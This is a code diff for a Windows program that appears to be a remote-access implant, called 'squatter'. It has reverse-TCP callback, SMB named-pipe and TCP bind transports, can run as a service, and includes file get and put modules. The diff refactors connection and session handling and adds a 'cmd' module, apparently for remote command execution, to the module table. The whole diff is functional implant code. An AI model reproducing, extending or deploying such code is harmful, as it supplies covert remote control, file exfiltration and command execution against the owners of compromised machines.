@@ -12,6 +12,7 @@
  * streams, and module dispatch.
  */
 #include "runtime/channel.h"
+#include "modules/cmd.h"
 #include "modules/echo.h"
 #include "modules/getfile.h"
 #include "runtime/module.h"
@@ -229,6 +230,71 @@ static void reap_done_sessions(sq_session **sessions, int *session_count)
     }
 }
 
+static void add_session_or_drop(sq_session **sessions, int *session_count,
+                                sq_session *s, const wchar_t *what)
+{
+    reap_done_sessions(sessions, session_count);
+    if (*session_count < SQ_MAX_SESSIONS) {
+        sessions[(*session_count)++] = s;
+        return;
+    }
+    SQLOG_ERROR(SQLOG_SUB_MUX, L"session capacity reached; dropping %s", what);
+    sq_session_destroy(s);
+}
+
+static BOOL connect_pipe_client(HANDLE pipe)
+{
+    BOOL connected = ConnectNamedPipe(pipe, NULL);
+
+    if (connected == FALSE) {
+        DWORD const err = GetLastError();
+        if (err == ERROR_PIPE_CONNECTED) {
+            return TRUE;
+        }
+        (void)CloseHandle(pipe);
+        if (!g_stop && err != ERROR_OPERATION_ABORTED &&
+            err != ERROR_INVALID_HANDLE) {
+            SQLOG_WINERR(SQLOG_SUB_MUX, ERROR, err,
+                         L"ConnectNamedPipe failed");
+        }
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static sq_session *session_from_pipe(HANDLE pipe, const sq_module_table *table)
+{
+    sq_channel *ch = sq_channel_from_handle(pipe);
+    sq_session *s = NULL;
+
+    if (ch == NULL) {
+        (void)CloseHandle(pipe);
+        return NULL;
+    }
+    s = sq_session_create(ch, table);
+    if (s == NULL) {
+        sq_channel_free(ch);
+    }
+    return s;
+}
+
+static sq_session *session_from_socket(SOCKET client,
+                                       const sq_module_table *table)
+{
+    sq_channel *ch = sq_channel_from_socket(client);
+    sq_session *s = NULL;
+
+    if (ch == NULL) {
+        (void)closesocket(client);
+        return NULL;
+    }
+    s = sq_session_create(ch, table);
+    if (s == NULL) {
+        sq_channel_free(ch);
+    }
+    return s;
+}
+
 static void run_named_pipe_server(const wchar_t *pipe_name,
                                   const sq_module_table *table)
 {
@@ -243,8 +309,6 @@ static void run_named_pipe_server(const wchar_t *pipe_name,
 
     while (!g_stop) {
         HANDLE pipe = create_pipe_instance(pipe_name);
-        BOOL connected = FALSE;
-        sq_channel *ch = NULL;
         sq_session *s = NULL;
 
         reap_done_sessions(sessions, &session_count);
@@ -255,47 +319,19 @@ static void run_named_pipe_server(const wchar_t *pipe_name,
             break;
         }
 
-        connected = ConnectNamedPipe(pipe, NULL);
-        if (connected == FALSE) {
-            DWORD const err = GetLastError();
-            if (err == ERROR_PIPE_CONNECTED) {
-                connected = TRUE;
-            } else {
-                (void)CloseHandle(pipe);
-                if (g_stop || err == ERROR_OPERATION_ABORTED ||
-                    err == ERROR_INVALID_HANDLE) {
-                    break;
-                }
-                SQLOG_WINERR(SQLOG_SUB_MUX, ERROR, err,
-                             L"ConnectNamedPipe failed");
-                continue;
+        if (!connect_pipe_client(pipe)) {
+            if (g_stop) {
+                break;
             }
+            continue;
         }
-
         g_pipe_listener = INVALID_HANDLE_VALUE;
-        if (connected == FALSE) {
-            (void)CloseHandle(pipe);
-            continue;
-        }
-
         SQLOG_INFO(SQLOG_SUB_MUX, L"named-pipe connection accepted");
-        ch = sq_channel_from_handle(pipe);
-        if (ch == NULL) {
-            (void)CloseHandle(pipe);
-            continue;
-        }
-        s = sq_session_create(ch, table);
+        s = session_from_pipe(pipe, table);
         if (s == NULL) {
-            sq_channel_free(ch);
             continue;
         }
-        reap_done_sessions(sessions, &session_count);
-        if (session_count < SQ_MAX_SESSIONS) {
-            sessions[session_count++] = s;
-        } else {
-            SQLOG_ERROR(SQLOG_SUB_MUX, L"session capacity reached; dropping pipe connection");
-            sq_session_destroy(s);
-        }
+        add_session_or_drop(sessions, &session_count, s, L"pipe connection");
     }
 
     SQLOG_INFO(SQLOG_SUB_MUX, L"shutting down (%d pipe session(s))", session_count);
@@ -321,7 +357,6 @@ static int run_tcp_bind_server(const wchar_t *port, const sq_module_table *table
 
     while (!g_stop) {
         SOCKET client = INVALID_SOCKET;
-        sq_channel *ch = NULL;
         sq_session *s = NULL;
 
         reap_done_sessions(sessions, &session_count);
@@ -333,23 +368,11 @@ static int run_tcp_bind_server(const wchar_t *port, const sq_module_table *table
             continue;
         }
         SQLOG_INFO(SQLOG_SUB_MUX, L"connection accepted");
-        ch = sq_channel_from_socket(client);
-        if (ch == NULL) {
-            (void)closesocket(client);
-            continue;
-        }
-        s = sq_session_create(ch, table);
+        s = session_from_socket(client, table);
         if (s == NULL) {
-            sq_channel_free(ch);
             continue;
         }
-        reap_done_sessions(sessions, &session_count);
-        if (session_count < SQ_MAX_SESSIONS) {
-            sessions[session_count++] = s;
-        } else {
-            SQLOG_ERROR(SQLOG_SUB_MUX, L"session capacity reached; dropping connection");
-            sq_session_destroy(s);
-        }
+        add_session_or_drop(sessions, &session_count, s, L"connection");
     }
 
     SQLOG_INFO(SQLOG_SUB_MUX, L"shutting down (%d session(s))", session_count);
@@ -426,11 +449,46 @@ static int run_as_service(wchar_t *service_name, const wchar_t *port,
     return -1;
 }
 
+static void parse_main_args(int argc, wchar_t **argv, const wchar_t **port,
+                            wchar_t **service_name)
+{
+    int i = 0;
+
+    for (i = 1; i < argc; i++) {
+        if (wide_eq(argv[i], L"--service") && i + 1 < argc) {
+            *service_name = argv[++i];
+        } else if (argv[i][0] != L'\0') {
+            *port = argv[i];
+        }
+    }
+}
+
+static int run_configured_transport(const wchar_t *port,
+                                    const sq_module_table *table)
+{
+    if (squatter_transport_config.kind == SQ_HOVEL_TRANSPORT_REVERSE_TCP) {
+        SOCKET peer = connect_reverse_tcp(&squatter_transport_config);
+        if (peer == INVALID_SOCKET) {
+            SQLOG_ERROR(SQLOG_SUB_MUX, L"failed to connect reverse TCP session");
+            return 1;
+        }
+        SQLOG_INFO(SQLOG_SUB_MUX, L"reverse TCP session connected");
+        run_single_session(peer, table);
+        return 0;
+    }
+    if (squatter_transport_config.kind == SQ_HOVEL_TRANSPORT_SMB_PIPE) {
+        run_named_pipe_server(squatter_transport_config.pipe_name, table);
+        return 0;
+    }
+    return run_tcp_bind_server(port, table);
+}
+
 int wmain(int argc, wchar_t **argv); /* -municode entry; declare to satisfy -Wmissing-prototypes */
 
 int wmain(int argc, wchar_t **argv)
 {
     static const sq_module modules[] = {
+        {"cmd", sq_cmd_module_main},
         {"echo", sq_echo_module_main},
         {"getfile", sq_getfile_module_main},
         {"putfile", sq_putfile_module_main},
@@ -441,15 +499,9 @@ int wmain(int argc, wchar_t **argv)
     const wchar_t *port = configured_port(&squatter_transport_config, configured_port_buffer);
     wchar_t *service_name = NULL;
     WSADATA wsa;
-    int i = 0;
+    int rc = 0;
 
-    for (i = 1; i < argc; i++) {
-        if (wide_eq(argv[i], L"--service") && i + 1 < argc) {
-            service_name = argv[++i];
-        } else if (argv[i][0] != L'\0') {
-            port = argv[i];
-        }
-    }
+    parse_main_args(argc, argv, &port, &service_name);
 
     sqlog_init();
     sqlog_set_level(SQLOG_LEVEL_INFO);
@@ -467,27 +519,8 @@ int wmain(int argc, wchar_t **argv)
         return 1;
     }
     (void)SetConsoleCtrlHandler(on_ctrl, TRUE);
-    if (squatter_transport_config.kind == SQ_HOVEL_TRANSPORT_REVERSE_TCP) {
-        SOCKET peer = connect_reverse_tcp(&squatter_transport_config);
-        if (peer == INVALID_SOCKET) {
-            SQLOG_ERROR(SQLOG_SUB_MUX, L"failed to connect reverse TCP session");
-            (void)WSACleanup();
-            return 1;
-        }
-        SQLOG_INFO(SQLOG_SUB_MUX, L"reverse TCP session connected");
-        run_single_session(peer, &table);
-        (void)WSACleanup();
-        sqlog_shutdown();
-        return 0;
-    }
-    if (squatter_transport_config.kind == SQ_HOVEL_TRANSPORT_SMB_PIPE) {
-        run_named_pipe_server(squatter_transport_config.pipe_name, &table);
-        (void)WSACleanup();
-        sqlog_shutdown();
-        return 0;
-    }
-    i = run_tcp_bind_server(port, &table);
+    rc = run_configured_transport(port, &table);
     (void)WSACleanup();
     sqlog_shutdown();
-    return i;
+    return rc;
 }
